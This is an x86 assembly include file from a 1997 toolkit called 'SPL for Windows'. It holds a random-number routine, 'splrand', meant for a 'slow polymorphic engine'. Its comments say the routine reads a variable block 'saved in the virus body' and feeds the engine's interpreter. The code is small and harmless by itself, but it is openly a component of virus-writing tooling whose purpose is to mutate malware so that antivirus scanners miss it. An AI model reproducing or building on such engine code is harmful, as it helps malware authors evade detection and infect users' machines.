;   SPL for Windows V2.10
;   (c)1997 by ANAKTAS	   
;
;   Description	:
;    This file contain the random generator function "splrand" 
;   Copy this function to your source file or put the command:
;   "INCLUDE splrand2.inc" in your source file.   
;   The difference of this routine from the one in "splrand.inc"
;   is that, it set only one of the 256 variables to a random value.
;   its for a slow polymorphic engine.
; -------------------------------------------------------------






;------------------------------------------------------
;Fuction <splrand>
;The random number generator.
;You must call this fuction before <sple>.
;Input:
;	ES:0000= Segment adress of a memory block.
;       DS:DX  = The saved block of variables. (512 bytes) 
;Output:
;	Registers and Flags are not effected.
;       The first 256 words (512 bytes) of ES:0000 will be used
;       as variable area. All variables of your engine are located 
;	there. DS:DX is a variable block, saved in the virus body. 
;	This version of <splrand>, randomize one variable in the DS:DX 
;	block, and then copy this, to ES:0000 for use by <splVM>.  
;
;------------------------------------------------------
splrand PROC NEAR 
        PUSHF 
        PUSH AX 
        PUSH CX 
	PUSH SI
	PUSH DI

;randomize one word in DS:DX (512 bytes)
        XOR AX,AX
	IN AL,040h 	
	ADD AX,AX	
	MOV SI,DX
	ADD SI,AX
	IN AL,040h               
        XOR DS:[SI],AL         
	IN AL,040h               
        ADD DS:[SI+1],AL         

;copy DS:DX to ES:0000 
	MOV CX,256  
	MOV SI,DX
	XOR DI,DI
	CLD
	REP MOVSW

	POP DI
	POP SI
        POP CX 
        POP AX 
        POPF 
        RET 
splrand ENDP 
;------------------------------------------------------

